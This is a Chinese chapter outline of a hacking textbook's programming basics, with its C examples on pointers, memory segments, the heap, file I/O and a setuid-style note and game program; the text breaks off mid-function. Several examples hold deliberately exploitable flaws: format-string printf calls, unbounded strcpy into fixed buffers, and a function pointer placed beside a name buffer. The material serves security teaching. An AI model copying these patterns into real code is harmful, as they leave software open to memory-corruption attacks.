#
```

```
```
第 2章 編程 5
	0x200. PROGRAMMING

2.1 編程的含義 5
	0x210. What Is Programming?

2.2 偽代碼 6
	0x220. Pseudo-code

2.3 控制結構 7
	0x230. Control Structures

2.3.1 If-Then-Else 7
	0x231. If-Then-Else

2.3.2 While/Until循環 9
	0x232. While/Until Loops

2.3.3 For循環 9
	0x233. For Loops

2.4 更多編程基本概念 10
	0x240. More Fundamental Programming Concepts

2.4.1 變量 11
	0x241. Variables

2.4.2 算術運算符 11
	0x242. Arithmetic Operators

2.4.3 比較運算符 13
	0x243. Comparison Operators

2.4.4 函數 15
	0x244. Functions

2.5 動手練習 18
	0x250. Getting Your Hands Dirty
		0x250. Getting Your Hands Dirtyfirstprog.c

2.5.1 瞭解全域 19
	0x251. The Bigger Picture

2.5.2 x86處理器 22
	0x252. The x86 Processor

2.5.3 匯編語言 23
	0x253. Assembly Language
		ASCII Table

2.6 接著學習基礎知識 36
	0x260. Back to Basics

2.6.1 字符串 36
	0x261. Strings
		char_array.c

	#include <stdio.h>
int main()
{
  char str_a[20];
  str_a[0]  = 'H';
  str_a[1]  = 'e';
  str_a[2]  = 'l';
  str_a[3]  = 'l';
  str_a[4]  = 'o';
  str_a[5]  = ',';
  str_a[6]  = ' ';
  str_a[7]  = 'w';
  str_a[8]  = 'o';
  str_a[9]  = 'r';
  str_a[10]  = 'l';
  str_a[11] = 'd';
  str_a[12] = '!';
  str_a[13] = '\n';
  str_a[14] = 0;
  printf(str_a); 
}

		char_array2.c
 
#include <stdio.h>
#include <string.h>

int main() {
   char str_a[20];

   strcpy(str_a, "Hello World!\n");
   printf(str_a);
}


2.6.2 signed、unsigned、long和short 40
	0x262. Signed, Unsigned, Long, and Short
		datatype_sizes.c

#include <stdio.h>

int main() {
	printf("The 'int' data type is\t\t %d bytes\n", sizeof(int));
	printf("The 'unsigned int' data type is\t %d bytes\n", sizeof(unsigned int));
	printf("The 'short int' data type is\t %d bytes\n", sizeof(short int));
	printf("The 'long int' data type is\t %d bytes\n", sizeof(long int));
	printf("The 'long long int' data type is %d bytes\n", sizeof(long long int));
	printf("The 'float' data type is\t %d bytes\n", sizeof(float));
	printf("The 'char' data type is\t\t %d bytes\n", sizeof(char));
}


2.6.3 指針 41
	0x263. Pointers
		pointer.c

#include <stdio.h>
#include <string.h>

int main() {
   char str_a[20];  
   char *pointer;   
   char *pointer2; 

   strcpy(str_a, "Hello World\n");
   pointer = str_a; 
   printf(pointer);

   pointer2 = pointer + 2;
   printf(pointer2);      
   strcpy(pointer2, "y you guys!\n"); 
   printf(pointer);        
}

		addressof.c

#include <stdio.h>

int main() {
	int int_var = 5;
	int *int_ptr;
	
	int_ptr = &int_var; 
}

		addressof2.c

#include <stdio.h>

int main() {
   int int_var = 5;
   int *int_ptr;

   int_ptr = &int_var; 

   printf("int_ptr = 0x%08x\n", int_ptr);
   printf("&int_ptr = 0x%08x\n", &int_ptr);
   printf("*int_ptr = 0x%08x\n\n", *int_ptr);

   printf("int_var is located at 0x%08x and contains %d\n", &int_var, int_var);
   printf("int_ptr is located at 0x%08x, contains 0x%08x, and points to %d\n\n", 
      &int_ptr, int_ptr, *int_ptr);
}

2.6.4 格式化字符串 46
	0x264. Format Strings
		fmt_strings.c

#include <stdio.h>

int main() {
   char string[10];
   int A = -73;
   unsigned int B = 31337;

   strcpy(string, "sample");

 
   printf("[A] Dec: %d, Hex: %x, Unsigned: %u\n", A, A, A);
   printf("[B] Dec: %d, Hex: %x, Unsigned: %u\n", B, B, B);
   printf("[field width on B] 3: '%3u', 10: '%10u', '%08u'\n", B, B, B);
   printf("[string] %s  Address %08x\n", string, string);


   printf("variable A is at address: %08x\n", &A);
}

		input.c

#include <stdio.h>
#include <string.h>

int main() {
   char message[10];
   int count, i;

   strcpy(message, "Hello, world!");

   printf("Repeat how many times? ");
   scanf("%d", &count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, message);
}

2.6.5 強制類型轉換 49
	0x265. Typecasting
		typecasting.c

#include <stdio.h>

int main() {
   int a, b;
   float c, d;

   a = 13;
   b = 5;

   c = a / b;                 
   d = (float) a / (float) b;  
   printf("[integers]\t a = %d\t b = %d\n", a, b);
   printf("[floats]\t c = %f\t d = %f\n", c, d);
}
	
	

		pointer_types.c

#include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = char_array;
	int_pointer = int_array;

	for(i=0; i < 5; i++) { 
		printf("[integer pointer] points to %p, which contains the integer %d\n", 
            int_pointer, *int_pointer);
		int_pointer = int_pointer + 1;
	}
	
	for(i=0; i < 5; i++) { 
		printf("[char pointer] points to %p, which contains the char '%c'\n", 
            char_pointer, *char_pointer);
		char_pointer = char_pointer + 1;
	}
}

		pointer_types2.c

#include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = int_array; 
	int_pointer = char_array; 

	for(i=0; i < 5; i++) { 
		printf("[integer pointer] points to %p, which contains the char '%c'\n",
            int_pointer, *int_pointer);
		int_pointer = int_pointer + 1;
	}
	
	for(i=0; i < 5; i++) {
		printf("[char pointer] points to %p, which contains the integer %d\n",
            char_pointer, *char_pointer);
		char_pointer = char_pointer + 1;
	}
}

		pointer_types3.c

#include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = (char *) int_array; 
	int_pointer = (int *) char_array;  

	for(i=0; i < 5; i++) { 
		printf("[integer pointer] points to %p, which contains the char '%c'\n",
            int_pointer, *int_pointer);
		int_pointer = (int *) ((char *) int_pointer + 1);
	}
	
	for(i=0; i < 5; i++) { 
		printf("[char pointer] points to %p, which contains the integer %d\n",
            char_pointer, *char_pointer);
		char_pointer = (char *) ((int *) char_pointer + 1);
	}
}

		pointer_types4.c

#include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	void *void_pointer;

	void_pointer = (void *) char_array;

	for(i=0; i < 5; i++) { 
		printf("[char pointer] points to %p, which contains the char '%c'\n",
            void_pointer, *((char *) void_pointer));
		void_pointer = (void *) ((char *) void_pointer + 1);
	}

	void_pointer = (void *) int_array;
	
	for(i=0; i < 5; i++) { 
		printf("[integer pointer] points to %p, which contains the integer %d\n",
            void_pointer, *((int *) void_pointer));
		void_pointer = (void *) ((int *) void_pointer + 1);
	}
}

		pointer_types5.c

#include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	unsigned int hacky_nonpointer;

	hacky_nonpointer = (unsigned int) char_array;

	for(i=0; i < 5; i++) { 
		printf("[hacky_nonpointer] points to %p, which contains the char '%c'\n",
            hacky_nonpointer, *((char *) hacky_nonpointer));
		hacky_nonpointer = hacky_nonpointer + sizeof(char);
	}

	hacky_nonpointer = (unsigned int) int_array;
	
	for(i=0; i < 5; i++) { 
		printf("[hacky_nonpointer] points to %p, which contains the integer %d\n",
            hacky_nonpointer, *((int *) hacky_nonpointer));
		hacky_nonpointer = hacky_nonpointer + sizeof(int);
	}
}


2.6.6 命令行參數 56
	0x266. Command-Line Arguments
		commandline.c

#include <stdio.h>

int main(int arg_count, char *arg_list[]) {
   int i;
   printf("There were %d arguments provided:\n", arg_count);
   for(i=0; i < arg_count; i++)
      printf("argument #%d\t-\t%s\n", i, arg_list[i]);
}

		convert.c

#include <stdio.h>

void usage(char *program_name) {
   printf("Usage: %s <message> <# of times to repeat>\n", program_name);
   exit(1);
}

int main(int argc, char *argv[]) {
   int i, count;

   if(argc < 3)     
      usage(argv[0]); 

   count = atoi(argv[2]); 
   printf("Repeating %d times..\n", count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, argv[1]);
}

		convert2.c

#include <stdio.h>

void usage(char *program_name) {
   printf("Usage: %s <message> <# of times to repeat>\n", program_name);
   exit(1);
}

int main(int argc, char *argv[]) {
   int i, count;



   count = atoi(argv[2]); 
   printf("Repeating %d times..\n", count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, argv[1]); 
}


2.6.7 變量作用域 60
	0x267. Variable Scoping
		scope.c

#include <stdio.h>

void func3() {
   int i = 11;
   printf("\t\t\t[in func3] i = %d\n", i);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i = %d\n", i);
   func3();
   printf("\t\t[back in func2] i = %d\n", i);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i = %d\n", i);
   func2();
   printf("\t[back in func1] i = %d\n", i);
}

int main() {
   int i = 3;
   printf("[in main] i = %d\n", i);
   func1();
   printf("[back in main] i = %d\n", i);
}

		scope2.c

#include <stdio.h>

int j = 42; 

void func3() {
   int i = 11, j = 999; 
   printf("\t\t\t[in func3] i = %d, j = %d\n", i, j);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i = %d, j = %d\n", i, j);
   printf("\t\t[in func2] setting j = 1337\n");
   j = 1337; 
   func3();
   printf("\t\t[back in func2] i = %d, j = %d\n", i, j);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i = %d, j = %d\n", i, j);
   func2();
   printf("\t[back in func1] i = %d, j = %d\n", i, j);
}

int main() {
   int i = 3;
   printf("[in main] i = %d, j = %d\n", i, j);
   func1();
   printf("[back in main] i = %d, j = %d\n", i, j);
}

		scope3.c

#include <stdio.h>

int j = 42;

void func3() {
   int i = 11, j = 999; 
   printf("\t\t\t[in func3] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t\t[in func3] j @ 0x%08x = %d\n", &j, j);
}

void func2() {
   int i = 7;
   printf("\t\t[in func2] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t[in func2] j @ 0x%08x = %d\n", &j, j);
   printf("\t\t[in func2] setting j = 1337\n");
   j = 1337; 
   func3();
   printf("\t\t[back in func2] i @ 0x%08x = %d\n", &i, i);
   printf("\t\t[back in func2] j @ 0x%08x = %d\n", &j, j);
}

void func1() {
   int i = 5;
   printf("\t[in func1] i @ 0x%08x = %d\n", &i, i);
   printf("\t[in func1] j @ 0x%08x = %d\n", &j, j);
   func2();
   printf("\t[back in func1] i @ 0x%08x = %d\n", &i, i);
   printf("\t[back in func1] j @ 0x%08x = %d\n", &j, j);
}

int main() {
   int i = 3;
   printf("[in main] i @ 0x%08x = %d\n", &i, i);
   printf("[in main] j @ 0x%08x = %d\n", &j, j);
   func1();
   printf("[back in main] i @ 0x%08x = %d\n", &i, i);
   printf("[back in main] j @ 0x%08x = %d\n", &j, j);
}

		static.c

#include <stdio.h>

void function() {
	int var = 5;
	static int static_var = 5;

	printf("\t[in function] var = %d\n", var);
	printf("\t[in function] static_var = %d\n", static_var);
	var++;         
	static_var++;  
}

int main() { 
	int i;
	static int static_var = 1337; 

	for(i=0; i < 5; i++) { 
		printf("[in main] static_var = %d\n", static_var);
		function(); 
	}
}
	

		static2.c

#include <stdio.h>

void function() { 
	int var = 5;
	static int static_var = 5; 

	printf("\t[in function] var  @ %p = %d\n", &var, var);
	printf("\t[in function] static_var @ %p = %d\n", &static_var, static_var);
	var++;          
	static_var++;   
}

int main() { 
	int i;
	static int static_var = 1337; 

	for(i=0; i < 5; i++) { 
		printf("[in main] static_var @ %p = %d\n", &static_var, static_var);
		function(); 
	}
}
	


2.7 內存(記憶體memory)分段 68
	0x270. Memory Segmentation
		stack_example.c

void test_function(int a, int b, int c, int d) {
   int flag;
   char buffer[10];

   flag = 31337;
   buffer[0] = 'A';
}

int main() {
   test_function(1, 2, 3, 4);
}


2.7.1 C語言中的內存分段 73
	0x271. Memory Segments in C
		memory_segments.c

#include <stdio.h>

int global_var;
int global_initialized_var = 5;

void function() {  
   int stack_var; 

   printf("the function's stack_var is at address 0x%08x\n", &stack_var);
}


int main() {
   int stack_var; 
   static int static_initialized_var = 5;
   static int static_var;
   int *heap_var_ptr;

   heap_var_ptr = (int *) malloc(4);

   
   printf("global_initialized_var is at address 0x%08x\n", &global_initialized_var);
   printf("static_initialized_var is at address 0x%08x\n\n", &static_initialized_var);

   
   printf("static_var is at address 0x%08x\n", &static_var);
   printf("global_var is at address 0x%08x\n\n", &global_var);

   
   printf("heap_var is at address 0x%08x\n\n", heap_var_ptr);

   
   printf("stack_var is at address 0x%08x\n", &stack_var);
   function();
}  


2.7.2 使用堆(heap) 75
	0x272. Using the Heap
		heap_example.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char *char_ptr;  
   int *int_ptr;    
   int mem_size;

   if (argc < 2)     
      mem_size = 50; 
   else
      mem_size = atoi(argv[1]);

   printf("\t[+] allocating %d bytes of memory on the heap for char_ptr\n", mem_size);
   char_ptr = (char *) malloc(mem_size); 

   if(char_ptr == NULL) {  
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   strcpy(char_ptr, "This is memory is located on the heap.");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[+] allocating 12 bytes of memory on the heap for int_ptr\n");
   int_ptr = (int *) malloc(12); 

   if(int_ptr == NULL) {  
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   *int_ptr = 31337; 
   printf("int_ptr (%p) --> %d\n", int_ptr, *int_ptr);


   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); 

   printf("\t[+] allocating another 15 bytes for char_ptr\n");
   char_ptr = (char *) malloc(15); 

   if(char_ptr == NULL) { 
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   strcpy(char_ptr, "new memory");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[-] freeing int_ptr's heap memory...\n");
   free(int_ptr); 
   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); 
}


2.7.3 對malloc()進行錯誤檢查 78
	0x273. Error-Checked malloc()
		errorchecked_heap.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void *errorchecked_malloc(unsigned int); 

int main(int argc, char *argv[]) {
   char *char_ptr;  
   int *int_ptr;    
   int mem_size;

   if (argc < 2)    
      mem_size = 50; 
   else
      mem_size = atoi(argv[1]);

   printf("\t[+] allocating %d bytes of memory on the heap for char_ptr\n", mem_size);
   char_ptr = (char *) errorchecked_malloc(mem_size); 

   strcpy(char_ptr, "This is memory is located on the heap.");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[+] allocating 12 bytes of memory on the heap for int_ptr\n");
   int_ptr = (int *) errorchecked_malloc(12); 

   *int_ptr = 31337; 
   printf("int_ptr (%p) --> %d\n", int_ptr, *int_ptr);

   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); 

   printf("\t[+] allocating another 15 bytes for char_ptr\n");
   char_ptr = (char *) errorchecked_malloc(15); 

   strcpy(char_ptr, "new memory");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[-] freeing int_ptr's heap memory...\n");
   free(int_ptr); 
   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); 
}

void *errorchecked_malloc(unsigned int size) { 
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL) {
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }
   return ptr;
}


2.8 運用基礎知識構建程序 79
	0x280. Building on Basics

2.8.1文件訪問 80
	0x281. File Access
		simplenote.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

void usage(char *prog_name, char *filename) {
   printf("Usage: %s <data to add to %s>\n", prog_name, filename);
   exit(0);
}

void fatal(char *);            
void *ec_malloc(unsigned int); 

int main(int argc, char *argv[]) {
   int fd; 
   char *buffer, *datafile;

   buffer = (char *) ec_malloc(100);
   datafile = (char *) ec_malloc(20);
   strcpy(datafile, "/tmp/notes");

   if(argc < 2)                 
      usage(argv[0], datafile); 

   strcpy(buffer, argv[1]);  
   printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);

   strncat(buffer, "\n", 1); 
	  

   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in main() while opening file");
   printf("[DEBUG] file descriptor is %d\n", fd);

   if(write(fd, buffer, strlen(buffer)) == -1)
      fatal("in main() while writing buffer to file");

   if(close(fd) == -1)
      fatal("in main() while closing file");

   printf("Note has been saved.\n");
   free(buffer);
   free(datafile);
}


void fatal(char *message) {
   char error_message[100];

   strcpy(error_message, "[!!] Fatal Error ");
   strncat(error_message, message, 83);
   perror(error_message);
   exit(-1);
}


void *ec_malloc(unsigned int size) {
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL)
      fatal("in ec_malloc() on memory allocation");
   return ptr;
}

		bitwise.c

#include <stdio.h>

int main() {
   int i, bit_a, bit_b;
   printf("bitwise OR operator  |\n");
   for(i=0; i < 4; i++) {
      bit_a = (i & 2) / 2; 
      bit_b = (i & 1);     
      printf("%d | %d = %d\n", bit_a, bit_b, bit_a | bit_b);
   }
   printf("\nbitwise AND operator  &\n");
   for(i=0; i < 4; i++) {
      bit_a = (i & 2) / 2; 
      bit_b = (i & 1);     
      printf("%d & %d = %d\n", bit_a, bit_b, bit_a & bit_b);
   }
}

		fcntl_flags.c

#include <stdio.h>
#include <fcntl.h>

void display_flags(char *, unsigned int);
void binary_print(unsigned int);

int main(int argc, char *argv[]) {
   display_flags("O_RDONLY\t\t", O_RDONLY);
   display_flags("O_WRONLY\t\t", O_WRONLY);
   display_flags("O_RDWR\t\t\t", O_RDWR);
   printf("\n");
   display_flags("O_APPEND\t\t", O_APPEND);
   display_flags("O_TRUNC\t\t\t", O_TRUNC);
   display_flags("O_CREAT\t\t\t", O_CREAT);
   printf("\n");
   display_flags("O_WRONLY|O_APPEND|O_CREAT", O_WRONLY|O_APPEND|O_CREAT);
}

void display_flags(char *label, unsigned int value) {
   printf("%s\t: %d\t:", label, value);
   binary_print(value);
   printf("\n");
}

void binary_print(unsigned int value) {
   unsigned int mask = 0xff000000; 
   unsigned int shift = 256*256*256; 
   unsigned int byte, byte_iterator, bit_iterator;

   for(byte_iterator=0; byte_iterator < 4; byte_iterator++) {
      byte = (value & mask) / shift; 
      printf(" ");
      for(bit_iterator=0; bit_iterator < 8; bit_iterator++) { 
         if(byte & 0x80) 
            printf("1");       
         else
            printf("0");      
         byte *= 2;         
      }
      mask /= 256;       
      shift /= 256;      
   }
}


2.8.2 文件權限 85
	0x282. File Permissions

2.8.3 用戶ID 86
	0x283. User IDs
		uid_demo.c

#include <stdio.h>

int main()
{
   printf("real uid: %d\n", getuid());
   printf("effective uid: %d\n", geteuid());
}

		hacking.h

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void fatal(char *message) {
   char error_message[100];

   strcpy(error_message, "[!!] Fatal Error ");
   strncat(error_message, message, 83);
   perror(error_message);
   exit(-1);
}


void *ec_malloc(unsigned int size) {
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL)
      fatal("in ec_malloc() on memory allocation");
   return ptr;
}


void dump(const unsigned char *data_buffer, const unsigned int length) {
	unsigned char byte;
	unsigned int i, j;
	for(i=0; i < length; i++) {
		byte = data_buffer[i];
		printf("%02x ", data_buffer[i]);  
		if(((i%16)==15) || (i==length-1)) {
			for(j=0; j < 15-(i%16); j++)
				printf("   ");
			printf("| ");
			for(j=(i-(i%16)); j <= i; j++) {  
				byte = data_buffer[j];
				if((byte > 31) && (byte < 127)) 
					printf("%c", byte);
				else
					printf(".");
			}
			printf("\n"); 
		} 
	} 
}


		notetaker.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hacking.h"

void usage(char *prog_name, char *filename) {
   printf("Usage: %s <data to add to %s>\n", prog_name, filename);
   exit(0);
}

void fatal(char *);            
void *ec_malloc(unsigned int); 

int main(int argc, char *argv[]) {
   int userid, fd; 
   char *buffer, *datafile;

   buffer = (char *) ec_malloc(100);
   datafile = (char *) ec_malloc(20);
   strcpy(datafile, "/var/notes");

   if(argc < 2)                
      usage(argv[0], datafile); 

   strcpy(buffer, argv[1]);  

   printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);

 
   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in main() while opening file");
   printf("[DEBUG] file descriptor is %d\n", fd);

   userid = getuid(); 


   if(write(fd, &userid, 4) == -1) 
      fatal("in main() while writing userid to file");
   write(fd, "\n", 1); 

   if(write(fd, buffer, strlen(buffer)) == -1) 
      fatal("in main() while writing buffer to file");
   write(fd, "\n", 1); 


   if(close(fd) == -1)
      fatal("in main() while closing file");

   printf("Note has been saved.\n");
   free(buffer);
   free(datafile);
}

		notesearch.c

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hacking.h"

#define FILENAME "/var/notes"

int print_notes(int, int, char *);   
int find_user_note(int, int);        
int search_note(char *, char *);     
void fatal(char *);                  

int main(int argc, char *argv[]) {
	int userid, printing=1, fd; 
	char searchstring[100];

	if(argc > 1)                        
		strcpy(searchstring, argv[1]);   
	else                                
		searchstring[0] = 0;             

	userid = getuid();
	fd = open(FILENAME, O_RDONLY);   
	if(fd == -1)
		fatal("in main() while opening file for reading");

	while(printing)
		printing = print_notes(fd, userid, searchstring);
	printf("-------[ end of note data ]-------\n");
	close(fd);
}


int print_notes(int fd, int uid, char *searchstring) {
	int note_length;
	char byte=0, note_buffer[100];
	
	note_length = find_user_note(fd, uid);
	if(note_length == -1)  
		return 0;           

	read(fd, note_buffer, note_length); 
	note_buffer[note_length] = 0;       
	
	if(search_note(note_buffer, searchstring)) 
		printf(note_buffer);                   
	return 1;
}


int find_user_note(int fd, int user_uid) {
	int note_uid=-1;
	unsigned char byte;
	int length;

	while(note_uid != user_uid) { 
		if(read(fd, &note_uid, 4) != 4) 
			return -1; 
		if(read(fd, &byte, 1) != 1) 
         return -1;

		byte = length = 0;
		while(byte != '\n') {  
			if(read(fd, &byte, 1) != 1)
				return -1;     
			length++;  
		}
	}
	lseek(fd, length * -1, SEEK_CUR); 

	printf("[DEBUG] found a %d byte note for user id %d\n", length, note_uid);
	return length;
}


int search_note(char *note, char *keyword) {
	int i, keyword_length, match=0;

	keyword_length = strlen(keyword);
	if(keyword_length == 0)  
		return 1;              
	
	for(i=0; i < strlen(note); i++) { 
		if(note[i] == keyword[match])  
			match++;   
		else {       
			if(note[i] == keyword[0]) 
				match = 1;  
			else
				match = 0;  
		}
		if(match == keyword_length) 
			return 1;   
	}
	return 0;  
}



2.8.4 結構 94
	0x284. Structs
		time_example.c

#include <stdio.h>
#include <time.h>

int main() {
	long int seconds_since_epoch;
	struct tm current_time, *time_ptr;
	int hour, minute, second, day, month, year;

	seconds_since_epoch = time(0); 
	printf("time() - seconds since epoch: %ld\n", seconds_since_epoch);

	time_ptr = &current_time;  
                              
	localtime_r(&seconds_since_epoch, time_ptr);

	
	hour = current_time.tm_hour;  
	minute = time_ptr->tm_min;    
	second = *((int *) time_ptr); 

	printf("Current time is: %02d:%02d:%02d\n", hour, minute, second);
}
	
	

		time_example2.c

#include <stdio.h>
#include <time.h>

void dump_time_struct_bytes(struct tm *time_ptr, int size) {
	int i;
	unsigned char *raw_ptr;

	printf("bytes of struct located at 0x%08x\n", time_ptr);
	raw_ptr = (unsigned char *) time_ptr;
	for(i=0; i < size; i++)
	{
		printf("%02x ", raw_ptr[i]);
		if(i%16 == 15) 
			printf("\n");
	}
	printf("\n");
}

int main() {
	long int seconds_since_epoch;
	struct tm current_time, *time_ptr;
	int hour, minute, second, i, *int_ptr;

	seconds_since_epoch = time(0); 
	printf("time() - seconds since epoch: %ld\n", seconds_since_epoch);

	time_ptr = &current_time;  
                             
	localtime_r(&seconds_since_epoch, time_ptr);

	
	hour = current_time.tm_hour; 
	minute = time_ptr->tm_min;  
	second = *((int *) time_ptr);

	printf("Current time is: %02d:%02d:%02d\n", hour, minute, second);

	dump_time_struct_bytes(time_ptr, sizeof(struct tm));

	minute = hour = 0;  
	int_ptr = (int *) time_ptr;

	for(i=0; i < 3; i++) {
		printf("int_ptr @ 0x%08x : %d\n", int_ptr, *int_ptr);
		int_ptr++; 
	}            
}
	
	

2.8.5 函數指針 98
	0x285. Function Pointers
		funcptr_example.c

#include <stdio.h>

int func_one() {
	printf("This is function one\n");
	return 1;
}

int func_two() {
	printf("This is function two\n");
	return 2;
}

int main() {
	int value;
	int (*function_ptr) ();

	function_ptr = func_one;
	printf("function_ptr is 0x%08x\n", function_ptr);
	value = function_ptr();
	printf("value returned was %d\n", value);

	function_ptr = func_two;
	printf("function_ptr is 0x%08x\n", function_ptr);
	value = function_ptr();
	printf("value returned was %d\n", value);
}
	


2.8.6 偽隨機數 99
	0x286. Pseudo-random Numbers
		rand_example.c

#include <stdio.h>
#include <stdlib.h>

int main() {
	int i;
	printf("RAND_MAX is %u\n", RAND_MAX);
	srand(time(0));

	printf("random values from 0 to RAND_MAX\n");
	for(i=0; i < 8; i++)
		printf("%d\n", rand());
	printf("random values from 1 to 20\n");
	for(i=0; i < 8; i++)
		printf("%d\n", (rand()%20)+1);
}


2.8.7 猜撲克遊戲 100
	0x287. A Game of Chance
		game_of_chance.c

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <stdlib.h>
#include "hacking.h"

#define DATAFILE "/var/chance.data"


struct user {
   int uid;
   int credits;
   int highscore;
   char name[100];
   int (*current_game) ();
};


int get_player_data();
void register_new_player();
void update_player_data();
void show_highscore();
void jackpot();
void input_name();
void print_cards(char *, char *, int);
int take_wager(int, int);
void play_the_game();
int pick_a_number();
int dealer_no_match();
int find_the_ace();
void fatal(char *);


struct user player;     

int main() {
   int choice, last_game;

   srand(time(0)); 
   
   if(get_player_data() == -1) 
      register_new_player();   
   
   while(choice != 7) {
      printf("-=[ Game of Chance Menu ]=-\n");
      printf("1 - Play the Pick a Number game\n");
      printf("2 - Play the No Match Dealer game\n");
      printf("3 - Play the Find the Ace game\n");
      printf("4 - View current high score\n");
      printf("5 - Change your user name\n");
      printf("6 - Reset your account at 100 credits\n");
      printf("7 - Quit\n");
      printf("[Name: %s]\n", player.name);
      printf("[You have %u credits] ->  ", player.credits);
      scanf("%d", &choice);

      if((choice < 1) || (choice > 7))
         printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
      else if (choice < 4) {  
            if(choice != last_game) { 
               if(choice == 1)        
                  player.current_game = pick_a_number;   
               else if(choice == 2)                     
                  player.current_game = dealer_no_match;
               else
                  player.current_game = find_the_ace;
               last_game = choice;   
            }
            play_the_game();   
         }
      else if (choice == 4)
         show_highscore();
      else if (choice == 5) {
         printf("\nChange user name\n");
         printf("Enter your new name: ");
         input_name();
         printf("Your name has been changed.\n\n");
      }
      else if (choice == 6) {
         printf("\nYour account has been reset with 100 credits.\n\n");
         player.credits = 100;
      }
   }
   update_player_data();
   printf("\nThanks for playing! Bye.\n");
}


int get_player_data() { 
   int fd, uid, read_bytes;
   struct user entry;

   uid = getuid();

   fd = open(DATAFILE, O_RDONLY);
   if(fd == -1) 
      return -1; 
   read_bytes = read(fd, &entry, sizeof(struct user));
   while(entry.uid != uid && read_bytes > 0) { 
      read_bytes = read(fd, &entry, sizeof(struct user)); 
   }
   close(fd); 
   if(read_bytes  < sizeof(struct user)) 
      return -1;
   else
      player = entry;
   return 1; 
}


void register_new_player()  { 
   int fd;

   printf("-=-={ New Player Registration }=-=-\n");
   printf("Enter your name: ");
   input_name();

   player.uid = getuid();
   player.highscore = player.credits = 100;

   fd = open(DATAFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in register_new_player() while opening file");
   write(fd, &player, sizeof(struct user));
   close(fd);

   printf("\nWelcome to the Game of Chance %s.\n", player.name);
   printf("You have been given %u credits.\n", player.credits);
}


void update_player_data() {
   int fd, i, read_uid;
   char burned_byte;

   fd = open(DATAFILE, O_RDWR);
   if(fd == -1) 
      fatal("in update_player_data() while opening file");
   read(fd, &read_uid, 4);       
   while(read_uid != player.uid) {  
      for(i=0; i < sizeof(struct user) - 4; i++)  
         read(fd, &burned_byte, 1);            
      read(fd, &read_uid, 4);    
   }
   write(fd, &(player.credits), 4);   
   write(fd, &(player.highscore), 4); 
   write(fd, &(player.name), 100);   
   close(fd);
}


void show_highscore() {
   unsigned int top_score = 0;
   char top_name[100];
   struct user entry;
   int fd;

   printf("\n====================| HIGH SCORE |====================\n");
   fd = open(DATAFILE, O_RDONLY);
   if(fd == -1)
      fatal("in show_highscore() while opening file");
   while(read(fd, &entry, sizeof(struct user)) > 0) { 
      if(entry.highscore > top_score) {  
            top_score = entry.highscore;  
            strcpy(top_name, entry.name); 
         }
   }
   close(fd);
   if(top_score > player.highscore)
      printf("%s has the high score of %u\n", top_name, top_score);
   else
      printf("You currently have the high score of %u credits!\n", player.highscore);
   printf("======================================================\n\n");
}


void jackpot() {
   printf("*+*+*+*+*+* JACKPOT *+*+*+*+*+*\n");
   printf("You have won the jackpot of 100 credits!\n");
   player.credits += 100;
}


void input_name() {
   char *name_ptr, input_char='\n';
